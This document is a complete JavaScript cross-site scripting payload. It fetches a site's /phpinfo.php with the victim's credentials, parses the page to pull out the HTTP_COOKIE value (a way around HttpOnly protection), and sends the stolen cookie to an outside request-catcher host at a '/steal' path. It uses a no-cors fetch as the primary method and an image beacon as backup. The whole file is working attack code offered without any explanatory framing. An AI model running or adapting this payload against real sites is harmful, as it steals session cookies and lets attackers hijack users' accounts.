(async () => {
  const target = "/phpinfo.php";
  const exfil = "https://secuna.requestcatcher.com/steal?cookie=";

  try {
    console.log("[XSS] Fetching phpinfo from", target);

    const r = await fetch(target, { credentials: "include" });

    console.log("[XSS] Response status:", r.status);

    const html = await r.text();
    console.log("[XSS] phpinfo length:", html.length);

    const d = new DOMParser().parseFromString(html, "text/html");

    // Extract table rows from phpinfo()
    const rows = Array.from(d.querySelectorAll("table tr"));
    console.log("[XSS] Found table rows:", rows.length);

    let httpCookie = null;

    for (const tr of rows) {
      const keyCell = tr.querySelector("td.e");
      const valCell = tr.querySelector("td.v");
      if (!keyCell || !valCell) continue;

      const keyText = keyCell.textContent.trim();
      if (keyText === "HTTP_COOKIE") {
        httpCookie = valCell.textContent.trim();
        console.log("[XSS] Found HTTP_COOKIE row", tr);
        break;
      }
    }

    if (!httpCookie) {
      console.warn("[XSS] HTTP_COOKIE not found");
      return;
    }

    console.log("[XSS] Extracted HTTP_COOKIE:", httpCookie);

    const exfilUrl = exfil + encodeURIComponent(httpCookie);
    console.log("[XSS] Exfiltrating:", exfilUrl);

    // ---- Primary exfil method (no-cors fetch) ----
    fetch(exfilUrl, {
      method: "GET",
      mode: "no-cors"
    })
    .then(() => console.log("[XSS] no-cors fetch sent"))
    .catch(err => console.error("[XSS] no-cors fetch error:", err));

    // ---- Backup exfil method (Image Beacon) ----
    const i = new Image();
    i.src = exfilUrl;
    console.log("[XSS] Image beacon sent");

  } catch (e) {
    console.error("[XSS] Top level error:", e);
  }
})();
